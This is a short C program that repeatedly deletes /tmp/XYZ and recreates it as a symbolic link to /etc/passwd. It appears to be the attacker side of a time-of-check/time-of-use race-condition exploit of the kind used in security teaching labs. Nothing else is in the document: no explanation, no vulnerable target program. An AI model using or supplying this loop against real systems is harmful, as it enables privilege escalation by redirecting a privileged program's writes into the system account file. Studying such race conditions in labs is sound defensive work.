#include <unistd.h>
int main(){
  while(1){
    unlink("/tmp/XYZ");
    symlink("/etc/passwd","/tmp/XYZ");
  }
  return 0;
}
